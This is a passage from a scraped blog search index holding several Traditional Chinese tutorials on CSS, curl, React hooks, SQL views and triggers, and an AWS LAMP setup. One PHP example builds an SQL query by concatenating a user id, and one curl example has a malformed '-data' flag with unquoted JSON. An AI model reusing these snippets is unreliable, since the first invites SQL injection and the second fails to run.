color: red; margin-right: 10px; } Output： 只要用「引號 ''」來隔開要拼接的字串就可以了（空格可有可無，但建議空啦比較好讀） 搭配 counter 來使用所以你就能利用這個特性來做出專屬的列表編號： 123456&lt;ul&gt; &lt;li&gt;Title&lt;/li&gt; &lt;li&gt;Title&lt;/li&gt; &lt;li&gt;Title&lt;/li&gt; &lt;li&gt;Title&lt;/li&gt;&lt;/ul&gt; 123456789101112131415ul { margin: 0; padding: 0; counter-reset: order;}li { list-style: none; counter-increment: order;}li::before { /* 在這裡自定內容 */ content: 'Q' counter(order) ':'; color: red; margin-right: 10px;} Output：","link":"/2022/01/22/css-string-concatenation/"},{"title":"CSS 讓文字有 ... 的效果","text":"需求不大的話利用它少寫一點 JavaScript。 不會滿出來囉備註：這只適用於單行文字，如果要多行文字請改用 JavaScript 來處理，或也可以參考 CSS 多行文字顯示 … 的效果 HTML： 1234&lt;div class=\"box\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Totam minus ea laudantium, corporis minima reprehenderit quis voluptatum&lt;/div&gt; CSS： 123456.box { width: 100px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;} 解釋一下為什麼要同時設定這三個屬性： white-space: nowrap =&gt; 讓文字只會有一行 overflow: hidden =&gt; 讓超出的 box 的範圍隱藏起來 text-overflow: ellipsis =&gt; 讓被隱藏的文字顯示「…」 就這麼簡單囉。","link":"/2022/01/13/css-text-overflow/"},{"title":"CSS 之我的文字太長啦","text":"太長啦。 文字太長如果有一段文字很長，都沒有「空白」或「換行」： 1&lt;div class=\"box\"&gt; HeyHelloyoapplebanannaverylongworldiwatchimaciphoneiwatchimaciphoneiwatchimaciphone&lt;/div&gt; 瀏覽器就沒辦法判斷該在哪裡斷行，這時候文字就會超出 box 的範圍： 要解決這個辦法可以設定word-break：break-all ： 但如果現在是有空格，只是有某個單字特別長，就不建議用 break-all，因為會腰斬： 你可以改用 word-break: break-word，就不會出現單字被砍半的問題： 不想被自動換行跟剛剛相反，如果現在文字有空白或換行： 12345&lt;div class=\"box\"&gt; Hey Hello yo apple bananna verylongworld iwatch imac iphone iwatch imac iphone iwatch imac iphone &lt;/div&gt; 這時候又不希望被自動換行的話可以使用 white-space: nowrap：","link":"/2022/01/12/css-text-problem/"},{"title":"CSS Tooltip 懶人包","text":"每次都要重讀 code 有點煩，所以直接寫在這裡。 簡述這邊只會貼往下彈出的版本，如果要其他方向參考這裡，稍微改一下就 OK 了。 非 hover 的版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/* 動畫 */@keyframes tooltips-vert { to { opacity: 0.9; transform: translate(-50%, 0); }}/* 本體 */[tooltip] { position: relative;}/* 訊息框跟三角形 */[tooltip]::before,[tooltip]::after { font-size: 0.9em; line-height: 1; user-select: none; pointer-events: none; position: absolute; opacity: 0; animation: tooltips-vert 300ms ease-out forwards;}/* 三角形 */[tooltip]::before { content: \"\"; border: 5px solid transparent; z-index: 1001;}/* 訊息框 */[tooltip]::after { content: attr(tooltip); font-family: Helvetica, sans-serif; text-align: center; min-width: 3em; max-width: 21em; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; padding: 1ch 1.5ch; border-radius: 0.3ch; box-shadow: 0 1em 2em -0.5em rgba(0, 0, 0, 0.35); background-color: #333; color: #fff; z-index: 1000;}/* 放到正下方 */[tooltip]::before { top: 100%; border-top-width: 0; border-bottom-color: #333;}/* 正下方 + 三角形的高度 */[tooltip]::after { top: calc(100% + 5px);}/* 水平置中 */[tooltip]::before,[tooltip]::after { left: 50%; transform: translate(-50%, 0.5em);} hover 版本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071@keyframes tooltips-vert { to { opacity: 0.9; transform: translate(-50%, 0); }}/* 本體 */[tooltip] { position: relative;}/* 訊息框跟三角形 */[tooltip]::before,[tooltip]::after { /* 一開始先藏起來 */ display: none; font-size: 0.9em; line-height: 1; user-select: none; pointer-events: none; position: absolute; opacity: 0;}/* 三角形 */[tooltip]::before { content: \"\"; border: 5px solid transparent; z-index: 1001;}/* 訊息框 */[tooltip]::after { content: attr(tooltip); font-family: Helvetica, sans-serif; text-align: center; min-width: 3em; max-width: 21em; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; padding: 1ch 1.5ch; border-radius: 0.3ch; box-shadow: 0 1em 2em -0.5em rgba(0, 0, 0, 0.35); background-color: #333; color: #fff; z-index: 1000;}/* 放到正下方 */[tooltip]::before { top: 100%; border-top-width: 0; border-bottom-color: #333;}/* 正下方 + 三角形的高度 */[tooltip]::after { top: calc(100% + 5px);}/* 水平置中 */[tooltip]::before,[tooltip]::after { left: 50%; transform: translate(-50%, 0.5em);}/* hover 時才秀出來 */[tooltip]:hover::before,[tooltip]:hover::after { display: block;}/* :hover 時加入動畫 */[tooltip]:hover::before,[tooltip]:hover::after { animation: tooltips-vert 300ms ease-out forwards;}","link":"/2022/02/24/css-tooltip/"},{"title":"更彈性化的文字設定，max-width 與 max-height","text":"設計是一門學問。 使用方式當區塊過大或過小時，文字可能會被拉的很長或很短，很難看。這時候可以善用 max-width 與 max-height 來解決，參考下面的圖： 💡 註：這是我參加 Frontend Mentor 挑戰中的範例，有興趣的話可以參考一下。 範例一： 範例二：","link":"/2022/01/16/css-trick-flexible-text/"},{"title":"CSS 垂直置中","text":"最經典的題目之一？ line-height 單行文字原理是利用行高來把文字推到中間： 12345.box { width: 200px; height: 200px; line-height: 200px;} 缺點是只適用於「一行文字」。 line-height 多行文字需搭配另外兩個屬性： inline-block vetical-align line-height 其實不僅限於文字，它可以適用所有「inline-level」的元素，所以只要把內容用「一個盒子」包起來就好： HTML： 123456&lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Dignissimos ad quo ipsam! Dolor &lt;/div&gt; &lt;/div&gt; CSS： 12345678910111213.box { margin: auto; width: 200px; line-height: 200px; text-align: center; background-color: orange;}.content { display: inline-block; /* line-height 會繼承，所以這裡要初始化 */ line-height: 1; vertical-align: middle;} 缺點是內容只能是 inline-level 元素，然後比較不直覺一點。 padding利用 padding 來撐開高度： 12345.box { width: 200px; height: 200px; padding: 30px 0;} 缺點是這樣就沒辦法設定高度。 absolute + transform我很常用的做法。 原理是用 absolute 把距離設為離參考點 1/2 的寬高距離，接著用 translate 讓元素往左上方偏移自身 1/2 的寬高： 12345678.box { width: 200px; height: 200px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);} 暫時想不到有什麼缺點，硬要說的話就是 Code 比較多吧。 absolute + margin auto有時候會用到的做法。 原理是利用 top bottom left right 來設定元素的「可用空間」，再加上 margin:auto 自動分配「剩餘空間」的特性來達成： 12345678910.box { position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 200px; height: 100px;} 缺點是元素必須設定固定的寬高（% 也 ok）才有效。 Flex + align itemsFlex 好棒棒！ 12345678910.box { width: 300px; height: 300px; padding: 0px 30px; margin: auto; background-color: orange; /* 重點是這兩行 */ display: flex; align-items: center;} Flex + margin autoFlex 盒子構造跟一般人不太一樣，所以只要對子元素設定 margin:auto 就能透過分配「剩餘空間」來達到垂直置中的效果。 備註：可以回想 absolute + margin 的原理，這個的原理跟它差不多。 HTML： 12345678&lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Totam minus ea laudantium, corporis minima reprehenderit quis voluptatum quiiure! Aliquid, eligendi provident tempora deleniti tempore obcaecati at neque optio nobis. &lt;/div&gt;&lt;/div&gt; CSS： 12345678910111213141516171819202122.box { box-sizing: border-box; width: 300px; height: 300px; background-color: orange; margin: auto; /* 重點 */ display: flex;}.content { width: 200px; background-color: black; padding: 20px; color: white; /* 重點： 記得要設定寬度， 就跟 block 要有寬度才能搭配 margin 來置中一樣 */ width: 200px; margin: auto;} relative + calc()只是想介紹一下 calc() 這個屬性，它可以對不同單位做計算： 123456&lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Totam minus ea laudantium, corporis minima reprehenderit quis voluptatum &lt;/div&gt;&lt;/div&gt; 1234567891011121314151617.box { width: 300px; height: 300px; background-color: orange; margin: auto;}.content { box-sizing: border-box; width: 200px; background-color: black; padding: 20px; color: white; /* 重點 */ position: relative; top: calc((100% - 200px) / 2); height: 200px;} 備註：top 跟 bottom 的 % 會相對於父層的 height，left 跟 right 的 % 會相對於 width。 簡單說明一下原理，其實重點是要算出 「.content 該離上面多少距離」。 不用想太複雜很簡單，只要知道 .content 的高度就夠了，為什麼？因為只要知道「可用空間」有多大，再把「可用空間 / 2」就是答案了。（把空間分配到左右邊，元素不就在中間了嗎？） 那要怎麼知道「可用空間」有多少？ =&gt; calc((100% - 200px)) 這個翻成白話就是「.box 的高度 - .content 的高度）」，所以最後除以二就是正確的距離了。","link":"/2022/01/13/css-vertical-align-center/"},{"title":"curl 的使用方法","text":"除了用 JavaScript 的方式以外，也可以用 Terminal 來發 request，另外也筆記一下 curl 指令的一些用法。 curl 的基本格式基本上都是以這個格式：curl -H -X GET [options] [URL] 來發出 request。 -H --header =&gt; 寫 header 相關的資訊 -X --request =&gt; 要使用 HTTP 的哪個方法，預設是 GET -d --data =&gt; [options] 的其中之一，代表要發出 content-type: application/x-www-form-urlencoded 的 POST 請求 -F --form =&gt; [options] 的其中之一，代表要送出 content-type: multipart/form-data 的 POST 請求 接下來會以 reqres 這個 API 來做點示範。 GET1curl -X GET https://reqres.in/api/users/2 預設就是 GET，所以省略 -X GET 也可以。 POST發出 content-type: application/x-www-form-urlencoded 的請求： 1curl -X POST -d 'name=PeaNu' -d 'job=F2E' https://reqres.in/api/users/2 發出 content-type: multipart/form-data 的請求： 1curl -X POST -F 'name=PeaNu' -F 'job=F2E' https://reqres.in/api/users/2 -X POST 可以省略，因為有帶 -d、-F 參數就能直接知道是一個 POST 請求 如果要傳遞 JSON 格式的資料可以這樣做： 1curl -H \"Content-Type: application/json\" -X POST -d '{\"name\": \"PeaNu\", \"job\": \"F2E\"}' https://reqres.in/api/users/2 如果想寫成換行的形式可以加上 \\： 123curl -X POST -H \"Content-Type: application/json\" \\ -data {\"name\": \"PeaNu\", \"job\": \"F2E\"} \\ https://reqres.in/api/users/2 DELETE1curl -i -X DELETE https://reqres.in/api/users/2 加上 -i 才可以看到回應的 header PATCH1curl -X PATCH -F 'name=PeaNu' -F 'job=F2E' https://reqres.in/api/users/2","link":"/2022/01/04/curl-usage/"},{"title":"使用 custom hook 時要注意的事情","text":"很愛捉弄人的 reference。 簡述這個觀念說難不難，但如果沒注意的話會很容易疏忽掉，所以才特別開一篇來紀錄一下。 假設我有一個 custom hook 是用來處理 request 的，長這樣： 123456789101112131415161718import { useState, useEffect } from \"react\"export const useFetch = (url) =&gt; { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { const fetchData = async () =&gt; { const res = await fetch(url) const json = await res.json() setData(json) } fetchData() }, [url]) return { data, isPending, error }} 這邊想說的是，useEffect 只要用了外部的變數或 state，就會要你把它們放到 dependencies 中，好讓值被更新時能夠重新執行一次 Effect。 在使用上面的 custom hook 時需要傳入 url，來執行不同的 request，所以把 url 放到 dependencies 合情合理，也沒有任何問題。 但請注意，這是建立在： 當參數不是 referece type（non-primitive）」的情況下才算數 當參數不是 referece type（non-primitive）」的情況下才算數 當參數不是 referece type（non-primitive）」的情況下才算數 怎麼說？ 你可以試著加入一個 option 參數，用 Object 的形式傳進去，看看會發生什麼事： 1234567function App () { const [url, setUrl] = useState('https://example.com') const { data, isPending, error } = useFetch(url, { type: 'GET' }) ... ... ...} 1234567891011121314151617181920import { useState, useEffect, useRef } from \"react\"export const useFetch = (url, options) =&gt; { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { // 這邊只把值印出來，不做其他事 console.log(options) const fetchData = async () =&gt; { const res = await fetch(url) const json = await res.json() setData(json) } fetchData() }, [url, options]) // 放到 dependencies return { data, isPending, error }} 按下存檔後，恭喜你又陷入無限迴圈了。 為什麼前面特別強調參數不可以 reference type？就是因為這樣，每一次執行 custom hook 時都會重新宣告一個新的 Object，重新宣告代表什麼？試著思考 {} === {} 會得到什麼？ 沒有錯，只會是 false。 所以只要是 reference type 的變數都要特別注意，你不可以直接這樣傳給 custom hook，接著又把它放到 dependencies 裡。 正確的做法如果想避免掉這種陷入無限迴圈的問題，你有兩種選擇： 把要「傳入」的參數用 useState 來儲存 把要「接收」的參數用 useRef 來儲存 先來看第一種作法： 1234567891011export default function App() { const [url, setUrl] = useState('https://example.com') // 建立 state const [optios, setOptions] = useState({type: 'GET'}) // 傳進去 const { data, isPending, error } = useFetch(url, optios) ... ... ...} 利用 state 是 Immutable 的特性來存狀態就可以避免掉不同 reference 的問題。 接著是第二種作法： 123456789101112131415161718192021import { useState, useEffect, useRef } from \"react\"export const useFetch = (url, _options) =&gt; { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) // 改用 useRef 來儲存 const options = useRef(_options).current useEffect(() =&gt; { console.log(options) const fetchData = async () =&gt; { const res = await fetch(url) const json = await res.json() setData(json) } fetchData() }, [url, options]) return { data, isPending, error }} 跟剛剛的道理一樣，利用 useRef 不會在 re-render 時被重新宣告的特性，就能避免不同 reference 的問題。 總之使用 custom hook 時一定要特別注意 reference 的問題，不然很容易陷入可怕的無窮迴圈。","link":"/2022/06/28/custom-hook-problem/"},{"title":"React 寫一個自己的 hook！","text":"這東西真神奇。 簡述儘管 React 有提供各種 hooks 給大家用，但你還可以進一步透過這些 hooks 來做出專屬某些用途的 hooks。 例如我想做一個專門處理 input 輸入的 hook，內容可能就會長這樣： 12345678910111213// useInput.jsimport { useState } from \"react\";// export 出去export function useInput (deault = null) { const [inputValue, setInputValue] = useState(deault); // input 的時候會把值更新為當前的 value const handleInput = (e) =&gt; { setInputValue(e.target.value); }; // function 的回傳值是三個東西 return { inputValue, setInputValue, handleInput } } 接著在 Component 裡就可以直接拿來用： 12345678910111213141516171819202122232425262728import { useInput } from '../custom-hooks/useInput';function TodoHeader({ handleAddTodo }) { // 第一個 input const { inputValue, setInputValue, handleInput } = useInput(); // 第二個 input，因為要有個各自的 state，所以得重新命名 const { inputValue: secondInputValue, setInputValue: secondSetInputValue, handleInput: secondHandleInput } = useInput(); // 表單提交的處理，不用管 const handleSubmit = (e) =&gt; { e.preventDefault(); handleAddTodo(inputValue); setInputValue(\"\"); }; return ( &lt;TodoHeaderWrapper onSubmit={handleSubmit}&gt; &lt;TodoInputBlock&gt; // 第一個 &lt;Input value={inputValue} onChange={handleInput}&gt;&lt;/Input&gt; // 第二個 &lt;Input value={secondInputValue} onChange={secondHandleInput}&gt;&lt;/Input&gt; &lt;BlueButton&gt;送出&lt;/BlueButton&gt; &lt;/TodoInputBlock&gt; &lt;/TodoHeaderWrapper&gt; );}export default TodoHeader; 出來的結果就會像這樣： 這樣子的好處是可以把「共同的邏輯」給抽出來，以及不用跟 UI 綁在一起，畢竟背後的邏輯都是一樣的。 總之，這樣方式可以讓你把「同一個邏輯」套用在「不同的 UI」上，這是我覺得最強大的地方。 如果把這個發揮到極致的話，甚至可以把整個功能拆出去，變得像這樣： 123456789101112131415161718192021222324252627282930313233import TodoItem from \"./components/TodoItem\";import TodoHeader from \"./components/TodoHeader\";import { useTodos } from \"./custom-hooks/todos\"function App() { const { id, todos, setTodos, handleAddTodo, handleRemoveTodo, handleToggleTodoState, } = useTodos() return ( &lt;div&gt; &lt;TodoHeader handleAddTodo={handleAddTodo}&gt;&lt;/TodoHeader&gt; {todos.map((todo) =&gt; { return ( &lt;TodoItem key={todo.id} todo={todo} handleRemoveTodo={handleRemoveTodo} handleToggleTodoState={handleToggleTodoState} &gt;&lt;/TodoItem&gt; ); })} &lt;/div&gt; );}export default App; 這是一個 todo list 的 hook。所有相關的邏輯都寫在 useTodos 中了。 現在 App 只需要關注 UI，跟把對應的方法（handleRemoveTodo 等等那些）綁定對應的事件處理就好，乾乾淨淨！","link":"/2022/04/08/custom-hook/"},{"title":"資料結構－Stack 與 Queue","text":"做個簡短的筆記。 簡述資料結構有很多種，比較常見的有： Array 陣列 Linked List 鏈結串列 Stack 堆疊 Queue 佇列 Tree 樹 目前只學會 Array、Stack 和 Queue，其他的等之後學會後再來補。 我覺得學資料結構的目的在於：如何挑選出最適合的資料結構，這個才是最重要的。 像 JavaScript 的 Event loop 就用到了 Stack 和 Queue 這兩個結構。我以前沒想過背後的原因是什麼，只知道這就是構成 Event loop 的要素，一直到了學會以後，才明白為什麼要用這兩個東西。 Stack 就跟疊自助餐餐盤一樣，一層一層疊上去。 按照這樣的特性，可以發現一件事：如果要拿到最下面的餐盤，就得把上面的餐盤都先拿起來，這個就是 Stack 最重要的特性了，俗稱「First In Last Out」。 用 JS 來實作也很簡單： 1234567891011121314151617181920class Stack { constructor () { this.stack = []; } push (item) { this.stack.push(item); return this.stack; } pop () { this.stack.pop(); return this.stack; }}const stack = new Stack();console.log(stack.push('A')); // [ 'A' ]console.log(stack.push('B')); // [ 'A', 'B' ]console.log(stack.push('C')); // [ 'A', 'B', 'C' ]console.log(stack.pop()); // [ 'A', 'B' ]console.log(stack.pop()); // [ 'A' ] Queue 就是排隊囉，不準插隊。 跟 Stack 相反，排在最前面的人會第一個離開隊伍，所以是「First In First Out」。 實作方式也不難： 1234567891011121314151617181920class Queue { constructor () { this.queue = []; } push (item) { this.queue.push(item); return this.queue; } shift () { this.queue.shift(); return this.queue; }}const queue = new Queue();console.log(queue.push('A')); // [ 'A' ]console.log(queue.push('B')); // [ 'A', 'B' ]console.log(queue.push('C')); // [ 'A', 'B', 'C' ]console.log(queue.shift()); // [ 'B', 'C' ]console.log(queue.shift()); // [ 'C' ]","link":"/2022/03/14/data-structure/"},{"title":"JavaScritp 中的資料型別","text":"懶人包。 要看一個資料的資料型別可以用 typeof &lt;value&gt; 來檢查（但 null 是例外）。 六種基本型別（Primitive） string number boolean undefined，代表一個變數「有宣告」但沒有值。沒宣告的話會得到 xxx is not defined 的 Error null，表示變數沒有值，希望變數是「空值」的時候可以使用。雖然它 typeof 會得到 object，但某個意義上來說算是 bug，所以把它當成是純值就好。 symbol，ES6 後的產物 非基本型別（Non-Primitive） Object Array function Array 做個補充Array 雖然可以放「不同型態」的資料，但是不建議這樣做。畢竟不同性質的東西你乾脆宣告不同的變數來儲存會比較直覺。 Array 不一定要從第一個開始放，沒有放的 JavaScript 會自動幫你「填值」，不過還是不建議這樣做（何必折磨自己的腦袋？）： 123var myArray = []myArray[10] = 100console.log(myArray) // [ &lt;10 empty item &gt;, 100] 參考資源JavaScript ：Primitive Types 純值(基本型別)介紹","link":"/2021/12/17/data-type/"},{"title":"資料庫正規化","text":"再複習一次。 簡述正規化這個東西其實可以分很多階級，像是： 第一正規化 第二正規化 第三正規化 … 簡單來說就是「做越多次，拆的越細」的意思，大部分只會做到第三正規化，最多可以到第五正規化（以我查到的資料來說啦）。 不過這裡沒有想談那麼細，我只希望訴你明白「正規化」實際是在做什麼就好了。如果真的想知道細節請參考這篇文章：Day 32 資料庫正規化(一~三) 在正規化以前假設你有一個訂單的 table，最直覺的設計應該會成這樣： 看起來還蠻合理的，不過你仔細想想會發現有一些問題： 1. 沒有重點用比較專業一點的術語來說是「沒有主鍵（Primary Key）」，但我覺得想成是沒有重點就好。 不過這是什麼意思？ 舉例來說，如果拿 1 | PeaNu | Macbook 這一欄來看，你有沒有辦法在「只看一格的情況下」就知道它想表達什麼？ 沒有辦法，你只看 1 看不懂，只看 PeaNu 也看不懂，只看 Mackbook 也一樣。只有把三個合起來一起看，你才知道「哦，這是編號 1 的訂單，有個叫 PeaNu 的人買了 Macbook」。 所以呢，這個就叫沒有重點（Primary Key）。 2. 很難維護想想看，如果哪天 PeaNu 突然想改名為 PePe，那就得把原本是 PeaNu 的地方全部改掉，有幾個就要改幾次。或是 PeaNu 買了 100 個產品，就得依照欄位輸入：訂單編號 | PeaNU | 產品名稱，輸入 100 次。 以上問題在資料量很小的時候，影響不大，所以不做正規化也沒關係。可是資料量大的時候沒做正規化，那就真的麻煩大了。 正規化以後基本上，正規化的概念可以想成是「把 table 獨立成另一個 table」。 來看一下剛剛的例子正規化後會長什麼樣： 現在把 table 拆成四個，分別是： orders，裡面儲存 id 和 user_id，代表「訂單編號」和「買家編號」 orders_products，裡面儲存 order_id 和 product_id，代表「訂單編號」和「產品編號」 users，裡面儲存 id 和 name，代表「買家編號」和「買家名稱」 products，裡面儲存 id 和 name，代表「產品編號」和「產品名稱」 經過正規化以後，能解決上面提到的問題： 1. 重點性雖然沒辦法只看一個欄位就知道在幹什麼？但至少你單看 orders 就可以知道裡面有 2 個訂單，或看 order_products 可以知道訂單 1 買了那些產品，以此類推。 總之呢，每個 table 裡都有一個「比較關鍵」的值（在這邊是 id），而不是像剛剛全部都混在一起。 2. 可維護性如果現在要改 PeaNu 的名字，只需要改 users 裡的 PeaNu 就好，因為 orders 裡的 user_id 不會變，或是 PeaNu 買了很多個產品，那也只要到 order_products 裡面新增 order_id = 1 和 product_id = 產品編號 就好。 以上就是正規化的用途，還有為什麼要正規化。雖然講的沒有很好，但應該至少會有一點概念吧～","link":"/2022/03/12/database-normalization/"},{"title":"資料庫中的 View、Stored Procedure 和 Triggers","text":"小知識。 View 只是一個用來「看」的表，可以想成是虛擬的 table。 實際用到的機會不多，但可以用在「不想讓別人看到原本 table」時，就只開一個 view 給它。 例如說你有 users、orders 和 products 這些 table，可是你的老闆只想看到像這樣的報表： 而不是一大堆看不懂的 users_id 或 products_id 之類的東西。 所以為了撈出上面的資訊，你大概會下這樣的 SQL： 123456789SELECT o.id, o.user_id. u.username, p.name, o.quantity, o.price, o.quantity * o.price AS totalFROM orders AS oJOIN users AS u on o.user_id = u.idJOIN products AS p on o.product_id = p.idORDER BY o.id ASC 接下來你有兩種做法： 用 PHP 包成一個 function 建立一個 View 建立 view 的方式不難，一樣是用 SQL 語法來建立「檢視表（view）」： 12345678910CREATE VIEW order_detail AS SELECT o.id, o.user_id. u.username, p.name, o.quantity, o.price, o.quantity * o.price AS total FROM orders AS o JOIN users AS u on o.user_id = u.id JOIN products AS p on o.product_id = p.id ORDER BY o.id ASC 接著就會看到有個叫做「檢視表」的欄位出現了： 它不是真的 table，它只是把剛剛下的 SQL 指令結果撈出來而已。 另外，既然都說是檢視表，就代表它真的只能「檢視」，不要再想說要對它做新增、編輯或刪除的操作了。 Stored Procedure（SP） 就像 SQL 的 function 這邊談的 function 不是這種： 1SELECT SUM(price) FROM order_detail 這是在 query 裡面用的 function。 我們要談的是可以直接「取代 SQL」的 function。 雖然你可能會想說幹嘛不直接 PHP 來寫一個 function 來用，像這樣： 12345function getUserOrder($id) { $sql = \"SELECT * FROM orders WHERE user_id=\" . $id; // ... return result;} 這樣子做當然也沒問題，可是如果能直接讓 SQL 本身就有這樣的 function，那不是更方便嗎？這個就是 SP 的目的。 至於用法的話是這樣子： 123456DELIMITER // # 重新設定CREATE PROCEDURE getOrder(id INT) BEGIN SELECT * FROM orders WHERE user_id = id; END //DELIMITER ; # 改回來 注意幾點： 為了避免分號的衝突，要先用 DELIMITER 指定要用什麼來取代分號。 宣告參數時要連同型態一起宣告 另外，一個 SP 都是以一個 data base 來當作單位，所以只有在你建立的地方才能使用。 如果要查看建立的 SP 有哪些的話，可以點「預存程序」來看： 不過 SP 是有缺點的，假如當 PHP 有 Bug 時，就得到 MySQL 看那個 function 是不是有錯，等於要兩邊來回跑的概念。 Triggers跟 git hooks 提到的概念一樣： 在事情發生前/後要做什麼？ 例如說我希望當 products 有更新時，就寫一個記錄到 products_audit 裡。 如果不透過 Trigger 的話，就得在 PHP 裡自己做這件事。所以善用 Trigger 就可以幫你減少一些麻煩。 所以接下來就講一下怎麼設定 Trigger： 123456789DELIMITER //CREATE TRIGGER before_product_update BEFORE UPDATE products FOR EACH ROWBEGIN INSERT INTO products_audit(product_id, name, price, action) VALUES(OLD.id, OLD.name, OLD.price, 'UPDATE');END //DELIMITER ; 附註：MySQL 會提供 OLD 和 NEW 這兩個變數來取得「資料更新前/後的值」 建立成功後，試著去改 products 後再來看 products_audit 就會發現自動更新內容了： 跟 SP 一樣，如果你要看建立了哪些 Trigger 就點「觸發器」來看：","link":"/2022/03/09/database-view-stored-procedure-and-triggers/"},{"title":"一刀未剪的 AWS 部署紀錄","text":"想把自己的部署過程紀錄下來。 簡述我參考的文章是這篇：[ 紀錄 ] 部屬 AWS EC2 雲端主機 + LAMP Server + phpMyAdmin。這是我覺得寫的最清楚的一篇，如果看不懂我的可以看它的就好。 至於這篇記錄可以簡單分成以下幾個重點： 開啟 AWS 的虛擬主機服務 連線到虛擬主機，並設定作業環境（LAMP） 買網域，然後把網域和 IP 位址串起來 過程中碰到的錯誤處理 另外標題也說了，這篇主要是以紀錄性質為主，所以我不會著墨太多在一些細節上，不懂的部分你還是得靠自己上網查資料，總之加油囉！ 第一步：開通 AWS 虛擬主機註冊 AWS 帳號沒錯，我在一開始就卡關了，因為手機驗證一直收不到驗證碼。另外還因為一直重新發送驗證碼太多次，害自己的帳號被 ban 掉： 後來聯繫客服，但等了 2 天都沒得到回應： 簡單來說，這個問題出在「電信行」的關係，因為我的手機是台灣之星所以才收不到。 總之最後決定重新辦一個新的帳號，並且跟家人借手機（台哥大），最後不到幾分鐘就解決這問題了。 所以呢，如果你的手機電信是台灣之星： 建議直接換一支手機來取得驗證碼 建議直接換一支手機來取得驗證碼 建議直接換一支手機來取得驗證碼 不然真的會被搞很久。 推薦閱讀：AWS Startups AWS Identity aws「Amazon web services」註冊電話驗證碼遲遲未收到？！ 選虛擬機器這邊就按照教學選擇 「Ubuntu Server 20.04 LTS (HVM), SSD Volume Type」 還蠻有趣的，真的好像在選主機一樣。 選擇方案一樣按照教學選擇有「綠色標章」的免費方案： 細節設定直接下一步 添加 Storage直接下一步 添加 tag直接下一步 設定安全群組 附註：仔細看會發現我這邊選成兩個 HTTP 了，這樣會有問題，所以選的時候要記得再確認一下。 if you want to set up a web server and allow Internet traffic to reach your instance, add rules that allow unrestricted access to the HTTP and HTTPS ports 簡單來說這邊是要設定「你想怎麼連到這台機器」。預設只有 SSH，所以你必須自己加上 HTTP 和 HTTPS 這兩個，這樣之後才有辦法用瀏覽器來連。 有趣的是這邊可以順便複習一下網路的知識，像圖片裡有出現 TCP 協議 和 port 這些專有名詞。雖然這邊的值是自動帶入而且不能改，但至少你能大概看懂這邊在設定什麼。 最後檢查就跟你網購買東西結帳的概念一樣，最後都會讓你確認一下你剛剛的選擇和設定： 設定金鑰（key pair）要連到這台機器的話必須透過 AWS 的公鑰（public key）和自己手上的私鑰（private key）。所以這邊要做設定。 下面有提醒你，設定好之後記得把私鑰下載到電腦裡保存，不然之後就沒辦法下載了。另外這邊也看到以前學的東西「RSA」，一種非對稱式加密的方法。 總之呢，確保私鑰下載完後就可以進到下一步了。 建立成功看到這畫面就代表成功了： 接著案右下角的「View Instance」。（這邊截圖截不到，但你滾軸往下滑就會看到了） 取得 IP 位址到這裡就已經完成主機的啟動囉！ 回主控台可以看到自己 server 的 Public IPv4 位址，記起來就對了。 第二步：連到虛擬主機和設定環境（LAMP）用 SSH 來連線 按下 conn，接著會跳出這畫面： 這邊有提供不同的選項來連線，但這邊會用 SSH 的方式來做。所以接下來打開你的 CLI，然後按照圖片的指示一步一步來。 1chmod 400 \"&lt;私鑰檔案路徑&gt;\" chmod（change mode）是 Linux 的指令，用來設定一個「檔案權限」，像是誰可以 read 啦、write 啦等等之類的。 所以簡單來說這邊是在設定「只有 user 可以 READ」這個私鑰檔案。詳細可以參考這個網站 接著： 1ssh -i \"&lt;私鑰檔案路徑&gt;\" ubuntu@ec2-&lt; IPv4 位置&gt;.compute-1.amazonaws.com 附註：-i 是 identity_file 的意思，所以後面才接私鑰檔案。 看到 welcome… 就代表連線成功了： 設定 LAMP接下來要來對這台主機設定伺服器環境：LAMP（Linux + Apache + MySQL + PHP） 附註：注意現在的主機是 Ubuntu，也就是 Linux 的環境，所以指令會跟一般你在 windows 上用的不一樣。（這邊也能明顯感受到你真的在操作遠端的主機，輸入指令都會卡卡的） 更新 Ubuntu 系統 1sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade 跑到一半時會跳出需要多少空間的訊息，問你要不要繼續？輸入 y 就好。 安裝 tasksel 1sudo apt install tasksel 一樣跟你說要多少空間，要不要繼續？輸入 y 就好。 用 tasksel 下載 lamp-server 1sudo tasksel install lamp-server 下載中的畫面： 下載完後就可以打開瀏覽器輸入 ip 位址來看看剛誕生的伺服器： 設定 phpmyadmin接著要來設定一些跟 PHP 和 MySQL 有關的東西。 下載 phpmyadmin 1sudo apt install phpmyadmin 一樣跟你說要多少空間，要不要繼續？輸入 y 就好。 連接 apache2 先按空白鍵 出現星號 * 按下 Enter 設定 configuration 這邊跟你說 phpmyadmin 必須先安裝 database 跟設定 configuration，如果你沒有要手動設定的話，直接按下 yes 就好。 設定密碼 填完之後用 tab 聚焦到 &lt;OK&gt; 再按下 Enter，如果沒填的話會隨機產生（這真是我看過最厲害的恐嚇方式），所以最好乖乖填。 確認密碼 再確認一次囉。 登入 phpmyadmin接著就可以到瀏覽器網址輸入 IPv4/phpmyadmin 進到登入畫面。但你會發現明明輸入正確卻無法登入： 簡單來說，剛剛設的密碼不是 root 這個使用者，而 root 預設的權限是沒辦法直接用密碼來登入的。 所以這邊要先修改 phpmyadmin 的設定，設定成 root 可以用密碼登入。 進入 mySQL 1sudo mysql -u root mysql 下 SQL 指令 1UPDATE user SET plugin='mysql_native_password' 